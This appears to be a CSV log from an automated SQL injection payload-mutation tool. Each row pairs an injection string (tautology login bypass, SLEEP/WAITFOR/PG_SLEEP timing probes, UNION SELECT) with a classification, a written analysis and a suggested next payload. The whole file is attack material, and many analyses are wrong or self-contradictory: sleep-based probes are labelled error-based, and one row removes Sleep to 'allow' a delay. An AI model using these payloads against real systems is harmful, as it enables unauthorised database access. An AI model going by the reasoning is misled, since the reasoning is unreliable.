1,id' OR 1=1 --,No Effect,The payload does not have a time-based or error-based SQL injection vulnerability as the response is normal and no error was returned.,"Modify the payload to test for time-based SQL injection by adding a large timestamp or sleep command, or use an error-based payload by appending an invalid input that may cause an error.",' OR SLEEP(10) --,200
1,id' AND 'a' IN 'a'#,Error-based SQL Injection,"The provided payload uses the 'AND' operator to combine conditions, which is a common method for Error-based SQL Injection attacks. However, it fails due to unexpected results in the response. To improve this attack, we can use an alternate approach such as using single quotation marks to bypass the filter and check for valid SQL syntax.",Replace the original payload with: 'id' IN (' AND 'a' IN 'a')--,'id' IN (' AND 'a' IN 'a')--,200
1,id%27 XOR 1%3D1/*,Error-based SQL Injection,"The original payload uses XOR operator, which is not commonly used in error-based SQL injection attacks. Replacing it with the AND operator or leaving it out and using a different approach like UNION SELECT may improve the chances of success.","Try to replace the '%27 XOR 1%3D1/*' with '%27 AND 1=1 /*', or remove the 'XOR 1%3D1' part and use a different approach such as ' UNION SELECT 1,2,3 -- '.",' AND 1=1 /*,200
1,id%27%09%26%26%09WAITFOR%09DELAY%09%270%3A0%3A5%27--,Time-based SQL Injection,"The original payload uses the WAITFOR DELAY statement, which is a timing attack to determine if an SQL injection vulnerability exists. However, in this case, the server response time (0.03s) is too short to confirm the existence of the vulnerability. The last working payload (OR 1=1 --) successfully bypassed authentication, indicating a potential SQL injection vulnerability.","To improve the payload, replace the WAITFOR DELAY statement with a comment symbol to avoid affecting the server's response time. This is based on the last working payload.",id%27%09-- OR 1=1 --,200
1,ID%27%20OR%20PG_SLEEP%285%29--,Error-based SQL Injection,"The original payload contains an error-based SQL injection attempt using the 'PG_SLEEP' function which is specific to PostgreSQL. Since it did not produce a successful result, we can modify the last working payload (' OR 1=1 --') by changing it to a generic error-based SQL injection (' UNION SELECT 1,2,3-- ') to make it compatible with more database management systems.","Replace 'PG_SLEEP' with a generic error-based SQL injection technique such as ' UNION SELECT 1,2,3-- '.","' UNION SELECT 1,2,3--",200
2,"' UNION SELECT 1,2,3--",Error-based SQL Injection,"The provided payload is failing, likely due to the server configuration or a different type of injection. We will improve upon the last working payload.",Adding the '--' comment after the SQL command is making it fail. Let's remove this and replace the payload with the last successful one., OR 1=1,200
3, OR 1=1,Login Bypass,The payload is attempting to bypass the login process by using a simple logical condition (OR 1=1). This can often grant unauthorized access if the system does not filter this type of input.,"Replace 'OR 1=1' with a more complex SQL statement that triggers an error, such as: ' OR 1=1 --'.",' OR 1=1 --,200
4,' OR 1=1 --,No Effect,"The payload does not alter the response in any significant way, as it is a common comment-based SQL injection attempt and the response time remains consistent.","Use a more complex payload to potentially bypass comment-based SQL injection defenses. For example: ' OR 1=1 -- AND (SELECT Sleep(5) FROM Users WHERE 1=1 LIMIT 0,1) --","OR 1=1 -- AND (SELECT Sleep(5) FROM Users WHERE 1=1 LIMIT 0,1) --",200
5,"OR 1=1 -- AND (SELECT Sleep(5) FROM Users WHERE 1=1 LIMIT 0,1) --",Time-based SQL Injection,"The initial payload uses the Sleep function in a subquery, which can be detected and blocked by some systems. The improved payload removes the Sleep function and focuses on slowing down the response time to indicate potential SQL injection.","Replace 'Sleep(5)' with a comment or other harmless operation that doesn't affect the response time significantly, but still allows for potential time delay.","OR 1=1 -- /* Sleep(5) */ AND (SELECT COUNT(*) FROM Users WHERE 1=1 LIMIT 0,1)",200
